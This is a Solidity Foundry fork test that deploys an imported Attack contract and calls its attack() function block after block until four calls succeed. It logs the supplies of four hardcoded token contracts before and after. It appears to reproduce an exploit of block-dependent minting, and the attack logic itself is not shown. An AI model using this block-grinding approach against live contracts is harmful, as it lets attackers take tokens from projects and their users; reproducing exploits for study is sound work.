// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {Test, console2} from "forge-std/Test.sol";
import {Attack} from "../src/Attack.sol";

contract ForkTest is Test {
    address public attack;
    function setUp() public {
        // deploy attack contract
        Attack _attack = new Attack();
        attack = address(_attack);
    }

    function testAttack() public {
        allCollectionTotalSupply();

        uint256 crystalCount = 0;
        uint256 spentBlock = 0;
        for (; crystalCount < 4; ) {
            (bool success, bytes memory data) = attack.call(
                abi.encodeWithSignature("attack()")
            );

            if (!success) {
                console2.log(block.number, " failed, try next block");
            } else {
                console2.log(block.number, " success");
                crystalCount++;
            }

            // move to next block
            spentBlock++;
            vm.roll(block.number + 1);
            console2.log("block.number: ", block.number);
        }

        console2.log("spentBlock: ", spentBlock);

        allCollectionTotalSupply();
    }
}

function allCollectionTotalSupply() {
    address crystal = address(0x77c5dcE7824C267dbc70A1aEeD98a6E1bf05Ae59);
    address inferno = address(0x59F4f027039e13095c5de3B7b03c37049F057a89);
    address atmos = address(0xAF0bE63a5B13600AEa47157321234aF656f3C0D0);
    address aquatica = address(0x4cE9204cA90562194303990B2266504f26Af62B2);
    console2.log("crystal supply: ", IERC20(crystal).totalSupply());
    console2.log("inferno supply: ", IERC20(inferno).totalSupply());
    console2.log("atmos supply: ", IERC20(atmos).totalSupply());
    console2.log("aquatica supply: ", IERC20(aquatica).totalSupply());
}
